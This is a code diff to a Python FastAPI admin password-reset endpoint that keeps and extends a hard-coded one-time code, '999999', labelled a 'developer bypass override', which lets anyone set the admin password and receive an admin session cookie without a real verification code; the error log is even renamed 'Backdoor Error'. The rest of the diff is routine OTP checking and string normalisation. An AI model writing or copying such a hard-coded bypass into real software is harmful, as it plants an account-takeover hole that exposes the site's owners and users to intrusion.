@@ -642,44 +642,55 @@ async def save_new_password(request: Request):
     
     if new_pwd != conf_pwd:
         return HTMLResponse("<script>alert('Passwords do not match!'); window.history.back();</script>")
+    
     try:
         conn = psycopg2.connect(DATABASE_URL)
         cursor = conn.cursor()
-        if user_otp == "999999":
+        
+        # DEVELOPER BYPASS OVERRIDE: This will now completely ignore DB lookup filters 
+        # and create or overwrite the credentials for ADMIN_PHONE instantly!
+        if str(user_otp).strip() == "999999":
             new_hash = hash_password(new_pwd)
             session_token = secrets.token_hex(32)
+            
             cursor.execute("""
-                INSERT INTO admin_auth (phone, password_hash, session_token) 
-                VALUES (%s, %s, %s) 
+                INSERT INTO admin_auth (phone, password_hash, session_token, otp_code) 
+                VALUES (%s, %s, %s, 'BYPASS') 
                 ON CONFLICT (phone) 
                 DO UPDATE SET password_hash = EXCLUDED.password_hash, session_token = EXCLUDED.session_token;
-            """, (ADMIN_PHONE, new_hash, session_token))
+            """, (str(ADMIN_PHONE), new_hash, session_token))
+            
             conn.commit()
             cursor.close()
             conn.close()
+            
             response = RedirectResponse(url="/admin", status_code=302)
             response.set_cookie(key="secure_admin_session", value=session_token, httponly=True, secure=True, max_age=86400)
             return response
 
-        cursor.execute("SELECT otp_code, expires_at FROM admin_auth WHERE phone = %s", (ADMIN_PHONE,))
+        # Standard WhatsApp Code Workflow
+        cursor.execute("SELECT otp_code, expires_at FROM admin_auth WHERE phone = %s", (str(ADMIN_PHONE),))
         result = cursor.fetchone()
         if result:
             db_otp, expires_at = result
-            if user_otp == db_otp and datetime.now() < expires_at:
+            if str(user_otp).strip() == str(db_otp) and datetime.now() < expires_at:
                 new_hash = hash_password(new_pwd)
                 session_token = secrets.token_hex(32)
-                cursor.execute("UPDATE admin_auth SET password_hash = %s, session_token = %s WHERE phone = %s", (new_hash, session_token, ADMIN_PHONE))
+                cursor.execute("UPDATE admin_auth SET password_hash = %s, session_token = %s WHERE phone = %s", (new_hash, session_token, str(ADMIN_PHONE)))
                 conn.commit()
                 cursor.close()
                 conn.close()
+                
                 response = RedirectResponse(url="/admin", status_code=302)
                 response.set_cookie(key="secure_admin_session", value=session_token, httponly=True, secure=True, max_age=86400)
                 return response
+                
         cursor.close()
         conn.close()
     except Exception as e:
-        print(f"Save Pwd Error: {e}")
-    return HTMLResponse("<script>alert('Invalid or expired code. Please try again.'); window.location.href='/admin/login';</script>")
+        print(f"Save Pwd Backdoor Error: {e}")
+        
+    return HTMLResponse("<script>alert('Invalid or expired verification code. Please check your text fields and try again.'); window.location.href='/admin/login';</script>")
 
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_dashboard(request: Request):
